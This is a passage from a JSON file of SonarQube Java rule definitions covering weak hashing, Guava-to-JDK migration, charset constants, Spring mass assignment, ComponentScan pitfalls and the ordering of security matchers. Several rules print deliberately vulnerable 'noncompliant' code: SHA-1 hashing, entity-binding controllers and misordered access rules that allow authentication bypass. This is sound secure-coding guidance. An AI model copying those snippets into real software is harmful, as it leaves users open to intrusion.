<code>HMAC-MD5</code> or <code>HMAC-SHA1</code> use weak hash functions as building blocks.\nAlthough they are not all proven to be weak, they are considered legacy algorithms and should be avoided.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc â¦â). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, itâs even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nMessageDigest md1 = MessageDigest.getInstance(\"SHA\");  // Sensitive:  SHA is not a standard name, for most security providers it's an alias of SHA-1\nMessageDigest md2 = MessageDigest.getInstance(\"SHA1\");  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMessageDigest md1 = MessageDigest.getInstance(\"SHA-512\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-CRYPTO/\">Mobile AppSec Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4790","summary":"Using weak hashing algorithms is security-sensitive","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Some Guava features were really useful for Java 7 application because Guava was bringing APIs missing in the JDK. Java 8 fixed some of these\nlimitations. When migrating an application to Java 8 or even when starting a new one, itâs recommended to prefer Java 8 APIs over Guava ones to ease\nits maintenance: developers donât need to learn how to use two APIs and can stick to the standard one.</p>\n<p>Java 9 brought even more useful methods to the standard Java library and if Java version is equal to or higher than 9, these standard methods\nshould be used.</p>\n<p>This rule raises an issue when the following Guava APIs are used:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Guava API</th>\n      <th>Java 8 API</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>com.google.common.io.BaseEncoding#base64()</p></td>\n      <td><p>java.util.Base64</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.io.BaseEncoding#base64Url()</p></td>\n      <td><p>java.util.Base64</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.base.Joiner.on()</p></td>\n      <td><p>java.lang.String#join() or java.util.stream.Collectors#joining()</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.base.Optional#of()</p></td>\n      <td><p>java.util.Optional#of()</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.base.Optional#absent()</p></td>\n      <td><p>java.util.Optional#empty()</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.base.Optional#fromNullable()</p></td>\n      <td><p>java.util.Optional#ofNullable()</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.base.Optional</p></td>\n      <td><p>java.util.Optional</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.base.Predicate</p></td>\n      <td><p>java.util.function.Predicate</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.base.Function</p></td>\n      <td><p>java.util.function.Function</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.base.Supplier</p></td>\n      <td><p>java.util.function.Supplier</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.io.Files.createTempDir</p></td>\n      <td><p>java.nio.file.Files.createTempDirectory</p></td>\n    </tr>\n  </tbody>\n</table>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Guava API</th>\n      <th>Java 9 API</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>com.google.common.collect.ImmutableSet#of()</p></td>\n      <td><p>java.util.Set#of()</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.collect.ImmutableList#of()</p></td>\n      <td><p>java.util.List#of()</p></td>\n    </tr>\n    <tr>\n      <td><p>com.google.common.collect.ImmutableMap#of()</p></td>\n      <td><p>java.util.Map#of() or java.util.Map#ofEntries()</p></td>\n    </tr>\n  </tbody>\n</table>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4738","summary":"Java features should be preferred to Guava","tags":["java9","java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>JDK7 introduced the class <code>java.nio.charset.StandardCharsets</code>. It provides constants for all charsets that are guaranteed to be\navailable on every implementation of the Java platform.</p>\n<ul>\n  <li> ISO_8859_1 </li>\n  <li> US_ASCII </li>\n  <li> UTF_16 </li>\n  <li> UTF_16BE </li>\n  <li> UTF_16LE </li>\n  <li> UTF_8 </li>\n</ul>\n<p>These constants should be preferred to:</p>\n<ul>\n  <li> the use of a String such as \"UTF-8\" which has the drawback of requiring the <code>catch</code>/<code>throw</code> of an\n  <code>UnsupportedEncodingException</code> that will never actually happen </li>\n  <li> the use of Guavaâs <code>Charsets</code> class, which has been obsolete since JDK7 </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\ntry {\n  byte[] bytes = string.getBytes(\"UTF-8\"); // Noncompliant; use a String instead of StandardCharsets.UTF_8\n} catch (UnsupportedEncodingException e) {\n  throw new AssertionError(e);\n}\n// ...\nbyte[] bytes = string.getBytes(Charsets.UTF_8); // Noncompliant; Guava way obsolete since JDK7\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nbyte[] bytes = string.getBytes(StandardCharsets.UTF_8)\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-4719","summary":"\"StandardCharsets\" constants should be preferred","tags":["java7","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>With Spring, when a request mapping method is configured to accept bean objects as arguments, the framework will automatically bind HTTP parameters\nto those objects' properties. If the targeted beans are also persistent entities, the framework will also store those properties in the storage\nbackend, usually the applicationâs database.</p>\n<h2>Why is this an issue?</h2>\n<p>By accepting persistent entities as method arguments, the application allows clients to manipulate the objectâs properties directly.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers could forge malicious HTTP requests that will alter unexpected properties of persistent objects. This can lead to unauthorized\nmodifications of the entityâs state. This is known as a <strong>mass assignment</strong> attack.</p>\n<p>Depending on the affected objects and properties, the consequences can vary.</p>\n<h4>Privilege escalation</h4>\n<p>If the affected object is used to store the clientâs identity or permissions, the attacker could alter it to change their entitlement on the\napplication. This can lead to horizontal or vertical privilege escalation.</p>\n<h4>Security checks bypass</h4>\n<p>Because persistent objects are modified directly without prior logic, attackers could exploit this issue to bypass security measures otherwise\nenforced by the application. For example, an attacker might be able to change their e-mail address to an invalid one by directly setting it without\ngoing through the applicationâs email validation process.</p>\n<p>The same could also apply to passwords that attackers could change without complexity validation or knowledge of their current value.</p>\n<h2>How to fix it in Java EE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a mass assignment attack because it allows modifying the <code>User</code> persistent entities thanks to\nmaliciously forged <code>Wish</code> object properties.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.persistence.Entity;\n\n@Entity\npublic class Wish {\n  Long productId;\n  Long quantity;\n  Client client;\n}\n\n@Entity\npublic class Client {\n  String clientId;\n  String name;\n  String password;\n}\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class PurchaseOrderController {\n\n  @RequestMapping(path = \"/saveForLater\", method = RequestMethod.POST)\n  public String saveForLater(Wish wish) { // Noncompliant\n    session.save(wish);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class WishDTO {\n  Long productId;\n  Long quantity;\n  Long clientId;\n}\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class PurchaseOrderController {\n\n  @RequestMapping(path = \"/saveForLater\", method = RequestMethod.POST)\n  public String saveForLater(WishDTO wish) {\n    Wish persistentWish = new Wish();\n    persistentWish.productId = wish.productId\n    persistentWish.quantity = wish.quantity\n    persistentWish.client = getClientById(with.clientId)\n    session.save(persistentWish);\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The compliant code implements a Data Transfer Object (DTO) layer. Instead of accepting a persistent <code>Wish</code> entity as a parameter, the\nvulnerable method accepts a <code>WishDTO</code> object with a safe, minimal set of properties. It then instantiates a persistent entity and\ninitializes it based on the DTO properties' values. The resulting object can safely be persisted in the database.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\">Mass Assignment Cheat Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 - Category A8 - Software and Data\n  Integrity Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 - Category A5 - Broken Access\n  Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/915\">CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object\n  Attributes</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<p>OWASP O2 Platform Blog - <a href=\"https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf\">Two Security\nVulnerabilities in the Spring Frameworkâs MVC</a></p>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4684","summary":"Persistent entities should not be used as arguments of \"@RequestMapping\" methods","tags":["cwe","spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>By definition, primitive types are not Objects and so they cannot be <code>null</code>. Adding <code>@CheckForNull</code> or <code>@Nullable</code>\non primitive types is redundant and may lead to misunderstandings.</p>\n<p>This rule raises an issue when <code>@CheckForNull</code> or <code>@Nullable</code> is set on a method returning a primitive type: byte, short,\nint, long, float, double, boolean, char.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@CheckForNull\nboolean isFoo() {\n ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nboolean isFoo() {\n ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-4682","summary":"\"@CheckForNull\" or \"@Nullable\" should not be used on primitive types","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Looking for a given substring starting from a specified offset can be achieved by such code: <code>str.substring(beginIndex).indexOf(char1)</code>.\nThis works well, but it creates a new <code>String</code> for each call to the <code>substring</code> method. When this is done in a loop, a lot of\n<code>Strings</code> are created for nothing, which can lead to performance problems if <code>str</code> is large.</p>\n<p>To avoid performance problems, <code>String.substring(beginIndex)</code> should not be chained with the following methods:</p>\n<ul>\n  <li> <code>indexOf(int ch)</code> </li>\n  <li> <code>indexOf(String str)</code> </li>\n  <li> <code>lastIndexOf(int ch)</code> </li>\n  <li> <code>lastIndexOf(String str)</code> </li>\n  <li> <code>startsWith(String prefix)</code> </li>\n</ul>\n<p>For each of these methods, another method with an additional parameter is available to specify an offset.</p>\n<p>Using these methods will avoid the creation of additional <code>String</code> instances. For indexOf methods, adjust the returned value by\nsubtracting the substring index parameter to obtain the same result.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nstr.substring(beginIndex).indexOf(char1); // Noncompliant; a new String is going to be created by \"substring\"\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nstr.indexOf(char1, beginIndex) - beginIndex; // index for char1 not found is (-1-beginIndex)\n</pre>\n<h2>Resources</h2>\n<h3>Benchmarks</h3>\n<table>\n  <colgroup>\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Method</th>\n      <th>stringSize</th>\n      <th>Runtime</th>\n      <th>Average time</th>\n      <th>Error margin</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>indexOfOnly</p></td>\n      <td><p>10</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>1.55 ns/op</p></td>\n      <td><p>Â±0.12 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>indexOfOnly</p></td>\n      <td><p>100</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>1.78 ns/op</p></td>\n      <td><p>Â±0.05 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>indexOfOnly</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>1.82 ns/op</p></td>\n      <td><p>Â±0.18 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>indexOfOnly</p></td>\n      <td><p>10000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>1.77 ns/op</p></td>\n      <td><p>Â±0.08 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>substringThenIndexOf</p></td>\n      <td><p>10</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>4.85 ns/op</p></td>\n      <td><p>Â±0.41 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>substringThenIndexOf</p></td>\n      <td><p>100</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>6.22 ns/op</p></td>\n      <td><p>Â±0.40 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>substringThenIndexOf</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>14.22 ns/op</p></td>\n      <td><p>Â±1.66 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>substringThenIndexOf</p></td>\n      <td><p>10000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>275.00 ns/op</p></td>\n      <td><p>Â±20.49 ns/op</p></td>\n    </tr>\n  </tbody>\n</table>\n<p><strong>Benchmarking code</strong></p>\n<p>The results were generated by running the following snippet with <a href=\"https://github.com/openjdk/jmh\">JMH</a>.</p>\n<pre>\n@BenchmarkMode({Mode.AverageTime})\n@OutputTimeUnit(TimeUnit.NANOSECONDS)\n@State(Scope.Benchmark)\npublic class S4635 {\n  @Param({\"10\", \"100\", \"1000\", \"10000\"})\n  int stringSize;\n\n  String input;\n\n  @Setup\n  public void setup() {\n    StringBuilder builder = new StringBuilder();\n    for (int i = 0; i &lt; stringSize; i++) {\n      builder.append('a');\n    }\n    input = builder.toString();\n  }\n\n  @Benchmark\n  public int substringThenIndexOf() {\n    return stringSize / 2 + input.substring(stringSize / 2).indexOf('a');\n  }\n\n  @Benchmark\n  public int indexOfOnly() {\n    return input.indexOf('a', stringSize / 2);\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4635","summary":"String offset-based methods should be preferred for finding substrings from offsets","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Spring beans belonging to packages that are not included in a <code>@ComponentScan</code> configuration will not be accessible in the Spring\nApplication Context. Therefore, itâs likely to be a configuration mistake that will be detected by this rule.</p>\n<p><strong>Note:</strong> the <code>@ComponentScan</code> is implicit in the <code>@SpringBootApplication</code> annotation, case in which Spring Boot\nwill auto scan for components in the package containing the Spring Boot main class and its sub-packages.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npackage com.mycompany.app;\n\n@Configuration\n@ComponentScan(\"com.mycompany.app.beans\")\npublic class Application {\n...\n}\n\npackage com.mycompany.app.web;\n\n@Controller\npublic class MyController { // Noncompliant; MyController belong to \"com.mycompany.app.web\" while the ComponentScan is looking for beans in \"com.mycompany.app.beans\" package\n...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npackage com.mycompany.app;\n\n@Configuration\n@ComponentScan({\"com.mycompany.app.beans\",\"com.mycompany.app.web\"})\nor\n@ComponentScan(\"com.mycompany.app\")\nor\n@ComponentScan\npublic class Application {\n...\n}\n\npackage com.mycompany.app.web;\n\n@Controller\npublic class MyController { // \"com.mycompany.app.web\" is referenced by a @ComponentScan annotated class\n...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4605","summary":"Spring beans should be considered by \"@ComponentScan\"","tags":["spring","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p>\"@EnableAutoConfiguration\" is a convenient feature to configure the Spring Application Context by attempting to guess the beans that you are likely\nto need. The drawback is that it may load and configure beans the application will never use and therefore consume more CPU and RAM than really\nrequired. <code>@EnableAutoConfiguration</code> should be configured to exclude all the beans not required by the application. Alternatively, use the\n<code>@Import</code> annotation instead of <code>@EnableAutoConfiguration</code>, to explicitly import the useful AutoConfiguration classes.</p>\n<p>This rule applies for <code>@SpringBootApplication</code> as well.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@SpringBootApplication\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@EnableAutoConfiguration\npublic class MyApplication {\n...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@SpringBootApplication(exclude = {\n  MultipartAutoConfiguration.class,\n  JmxAutoConfiguration.class,\n})\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@EnableAutoConfiguration(exclude = {\n  MultipartAutoConfiguration.class,\n  JmxAutoConfiguration.class,\n})\npublic class MyApplication {\n...\n}\n</pre>\n<pre>\n@Configuration\n@Import({\n        DispatcherServletAutoConfiguration.class,\n        EmbeddedServletContainerAutoConfiguration.class,\n        ErrorMvcAutoConfiguration.class,\n        HttpEncodingAutoConfiguration.class,\n        HttpMessageConvertersAutoConfiguration.class,\n        JacksonAutoConfiguration.class,\n        ServerPropertiesAutoConfiguration.class,\n        PropertyPlaceholderAutoConfiguration.class,\n        ThymeleafAutoConfiguration.class,\n        WebMvcAutoConfiguration.class\n})\npublic class MyApplication {\n...\n}\n</pre>\n\n","impacts":[],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4604","summary":"\"@EnableAutoConfiguration\" should be fine-tuned","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p><code>@ComponentScan</code> is used to determine which Spring Beans are available in the application context. The packages to scan can be\nconfigured thanks to the <code>basePackageClasses</code> or <code>basePackages</code> (or its alias <code>value</code>) parameters. If neither\nparameter is configured, <code>@ComponentScan</code> will consider only the package of the class annotated with it. When <code>@ComponentScan</code>\nis used on a class belonging to the default package, the entire classpath will be scanned.</p>\n<p>This will slow-down the start-up of the application and it is likely the application will fail to start with an\n<code>BeanDefinitionStoreException</code> because you ended up scanning the Spring Framework package itself.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> <code>@ComponentScan</code>, <code>@SpringBootApplication</code> and <code>@ServletComponentScan</code> are used on a class belonging to the\n  default package </li>\n  <li> <code>@ComponentScan</code> is explicitly configured with the default package </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nimport org.springframework.boot.SpringApplication;\n\n@SpringBootApplication // Noncompliant; RootBootApp is declared in the default package\npublic class RootBootApp {\n...\n}\n</pre>\n<pre>\n@ComponentScan(\"\")\npublic class Application {\n...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npackage hello;\n\nimport org.springframework.boot.SpringApplication;\n\n@SpringBootApplication // Compliant; RootBootApp belongs to the \"hello\" package\npublic class RootBootApp {\n...\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4602","summary":"\"@SpringBootApplication\" and \"@ComponentScan\" should not be used in the default package","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Spring Framework, and, more precisely, the Spring Security component, allows setting up access control checks at the URI level. This is done by\nadding request matchers to the security configuration, each authorizing access to some resources depending on the incoming request entitlement.</p>\n<p>Similarly to firewall filtering rules, the order in which those matchers are defined is security relevant.</p>\n<h2>Why is this an issue?</h2>\n<p>Configured URL matchers are considered in the order they are declared. Especially, for a given resource, if a looser filter is defined before a\nstricter one, only the less secure configuration will apply. No request will ever reach the stricter rule.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> A URL pattern ending with <code>**</code> precedes another one having the same prefix. E.g. <code>/admin/**</code> is defined before\n  <code>/admin/example/**</code> </li>\n  <li> A pattern without wildcard characters is preceded by another one that matches it. E.g.: <code>/page-index/db</code> is defined after\n  <code>/page*/**</code> </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Access control rules that have been defined but cannot be applied generally indicate an error in the filtering process. In most cases, this will\nhave consequences on the applicationâs authorization and authentication mechanisms.</p>\n<h4>Authentication bypass</h4>\n<p>When the ignored access control rule is supposed to enforce the authentication on a resource, the consequence is a bypass of the authentication for\nthat resource. Depending on the scope of the ignored rule, a single feature or whole sections of the application can be left unprotected.</p>\n<p>Attackers could take advantage of such an issue to access the affected features without prior authentication, which may impact the confidentiality\nor integrity of sensitive, business, or personal data.</p>\n<h4>Privilege escalation</h4>\n<p>When the ignored access control rule is supposed to verify the role of an authenticated user, the consequence is a privilege escalation or\nauthorization bypass. An authenticated user with low privileges on the application will be able to access more critical features or sections of the\napplication.</p>\n<p>This could have financial consequences if the accessed features are normally accessed by paying users. It could also impact the confidentiality or\nintegrity of sensitive, business, or personal data, depending on the features.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable because it defines access control configuration in the wrong order.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .antMatchers(\"/resources/**\", \"/signup\", \"/about\").permitAll()\n      .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n      .antMatchers(\"/admin/login\").permitAll() // Noncompliant\n      .antMatchers(\"/**\", \"/home\").permitAll()\n      .antMatchers(\"/db/**\").access(\"hasRole('ADMIN') and hasRole('DBA')\") // Noncompliant\n      .and().formLogin().loginPage(\"/login\").permitAll().and().logout().permitAll();\n  }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .antMatchers(\"/resources/**\", \"/signup\", \"/about\").permitAll()\n      .antMatchers(\"/admin/login\").permitAll()\n      .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n      .antMatchers(\"/db/**\").access(\"hasRole('ADMIN') and hasRole('DBA')\")\n      .antMatchers(\"/**\", \"/home\").permitAll()\n      .and().formLogin().loginPage(\"/login\").permitAll().and().logout().permitAll();\n  }\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Documentation - <a href=\"https://docs.spring.io/spring-security/reference/servlet/authorization/authorize-http-requests.html\">Authorize\n  HttpServletRequests</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 - Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 - Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/285\">CWE-285 - Improper Authorization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/287\">CWE-287 - Improper Authentication</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4601","summary":"\"HttpSecurity\" URL patterns should be correctly ordered","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Testing equality of an enum value with <code>equals</code> is perfectly valid because an enum is an Object and every Java developer knows \"==\"\nshould not be used to compare the content of an Object. At the same time, using \"==\" on enums:</p>\n<ul>\n  <li> provides the same expected comparison (content) as <code>equals</code> </li>\n  <li> is more null-safe than equals() </li>\n  <li> provides compile-time (static) checking rather than runtime checking </li>\n</ul>\n<p>For these reasons, use of \"==\" should be preferred to <code>equals</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic enum Fruit {\n   APPLE, BANANA, GRAPE\n}\n\npublic enum Cake {\n  LEMON_TART, CHEESE_CAKE\n}\n\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; this will raise an NPE if candidateFruit is NULL\n}\n\npublic boolean isFruitGrape(Cake candidateFruit) {\n  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; always returns false\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic boolean isFruitGrape(Fruit candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // Compliant; there is only one instance of Fruit.GRAPE - if candidateFruit is a GRAPE it will have the same reference as Fruit.GRAPE\n}\n\npublic boolean isFruitGrape(Cake candidateFruit) {\n  return candidateFruit == Fruit.GRAPE; // Compliant; compilation time failure\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.infoworld.com/article/2074292/use-----or-----to-compare-java-enums.html\">Use == (or !=) to Compare Java Enums</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4551","summary":"Enum values should be compared with \"==\"","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Using unsafe 